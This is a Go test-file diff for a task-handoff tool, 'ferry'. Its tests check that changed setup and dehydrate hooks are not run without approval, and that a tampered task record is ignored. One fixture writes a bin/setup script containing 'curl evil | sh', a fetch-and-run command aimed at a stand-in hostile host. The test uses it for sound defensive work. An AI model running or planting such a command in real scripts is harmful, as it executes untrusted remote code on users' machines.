@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"strings"
@@ -72,5 +73,54 @@ func TestRunHookRefusesBytesThatWerentApproved(t *testing.T) {
 	}
 	if exists(filepath.Join(home, "pwned")) {
 		t.Fatal("changed hook ran")
+	}
+}
+
+func TestDehydrateAsksEveryRunOnceTheTaskHasBeenOnKant(t *testing.T) {
+	w := newWorld(t)
+	wt := w.laptopTask()
+	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
+	kwt := filepath.Join(w.kant, "src/app-wt/fix-auth")
+	w.write(kwt, "bin/setup", "#!/bin/sh\ncurl evil | sh\n")
+	w.approve(w.kant, dehydrateScript)
+	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
+	os.Remove(filepath.Join(wt, ".ferry/state/db.dump"))
+
+	// dehydrateScript is approved on the laptop, but the worktree now holds
+	// kant's code, so it must still ask (and, with no terminal, skip).
+	out, _ := w.ferry(wt, "to", "kant", "--yes", "--no-launch")
+	if !strings.Contains(out, "asks before every run") || !strings.Contains(out, "bin/setup") {
+		t.Fatalf("dehydrate should ask and call out bin/setup:\n%s", out)
+	}
+	if exists(filepath.Join(wt, ".ferry/state/db.dump")) {
+		t.Fatal("dehydrate ran without asking")
+	}
+}
+
+func TestChangeSummaryIgnoresTheRecordOnKant(t *testing.T) {
+	w := newWorld(t)
+	wt := w.laptopTask()
+	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
+	w.write(filepath.Join(w.kant, "src/app-wt/fix-auth"), "package.json", "{}\n")
+	w.approve(w.kant, dehydrateScript)
+	// Stop the handoff after its commit point, so the rerun works from the
+	// record: the laptop can't place the session.
+	os.RemoveAll(filepath.Join(w.laptop, ".claude/projects"))
+	w.write(w.laptop, ".claude/projects", "not a directory")
+	if out, err := w.ferry(w.laptop, "from", "kant", "fix-auth", "--yes"); err == nil {
+		t.Fatalf("first run should fail placing the session:\n%s", out)
+	}
+	os.Remove(filepath.Join(w.laptop, ".claude/projects"))
+	rp := filepath.Join(w.kant, ".local/state/ferry/tasks", taskKey("src/app-wt/fix-auth")+".json")
+	var rec map[string]any
+	data, _ := os.ReadFile(rp)
+	json.Unmarshal(data, &rec)
+	rec["changes"] = "nothing to see here"
+	data, _ = json.Marshal(rec)
+	os.WriteFile(rp, data, 0o600)
+
+	out := w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
+	if strings.Contains(out, "nothing to see here") || !strings.Contains(out, "package.json") {
+		t.Fatalf("summary should come from the laptop's own refs:\n%s", out)
 	}
 }
